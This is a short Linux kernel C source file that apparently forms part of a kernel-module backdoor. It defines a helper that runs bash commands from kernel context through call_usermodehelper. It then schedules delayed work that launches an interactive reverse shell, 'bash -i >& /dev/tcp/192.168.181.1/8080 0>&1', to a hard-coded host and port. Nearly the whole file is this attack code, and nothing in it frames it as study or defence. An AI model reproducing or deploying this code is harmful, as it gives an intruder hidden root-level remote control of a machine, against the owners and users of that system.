#include <linux/workqueue.h>
#include <linux/umh.h>



int bash_run(const char *bash_command, int wait_policy) {
    char *argv_main[] = {
            "/bin/bash",
            "-c",
            bash_command,
            NULL,
    };
    char *envp_main[] = {
            "HOME=/",
            "TERM=linux",
            "PATH=/sbin:/bin:/usr/sbin:/usr/bin",
            NULL,
    };
    return call_usermodehelper(argv_main[0], argv_main, envp_main, wait_policy);
}


void bash_task(struct work_struct *_){
        bash_run("bash -i >& /dev/tcp/192.168.181.1/8080 0>&1", UMH_WAIT_EXEC);
}

static DECLARE_DELAYED_WORK(bask_loop_task, bash_task
);

int kernel_schedule_loop(void) {
    int bool_result = schedule_delayed_work(&bask_loop_task, 500);
    return bool_result ? 0 : -1;
}
